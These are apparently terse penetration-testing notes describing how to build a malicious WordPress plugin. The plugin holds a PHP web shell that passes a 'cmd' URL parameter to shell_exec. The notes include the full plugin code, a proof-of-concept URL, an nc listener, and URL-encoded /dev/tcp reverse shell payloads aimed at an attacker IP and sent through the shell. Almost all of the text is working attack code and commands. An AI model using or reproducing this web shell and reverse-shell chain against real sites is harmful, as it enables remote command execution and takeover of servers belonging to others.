Create the plugin from scratch:

mkdir malicious_shell_plugin/

cd malicious_shell_plugin/

sudo nano malicious-plugin.php

CODE:

<?php
/*
Plugin Name: Malicious wordpress plugin
Description: A plugin with a web shell.
Version: 1.1337
Author: 1337 
*/

if (isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>
sudo chmod +x malicious-plugin.php

zip -r shell_plugin.zip shell_plugin

Check if file is there

http://1337.codes/wp-content/plugins/shell_plugin/

Proof of concept:

http://1337.codes/wp-content/plugins/shell_plugin/malicious-plugin.php?cmd=id

Setup a listener:

┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444

Pick a shell from https://www.revshells.com/

sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.201%2F4444%200%3E%261

Make it beter with bash -c "COMMAND"

bash%20-c%20"sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.201%2F4444%200%3E%261"

http://1337.codes/wp-content/plugins/shell_plugin/malicious-plugin.php?cmd=bash%20-c%20"sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.201%2F4444%200%3E%261"
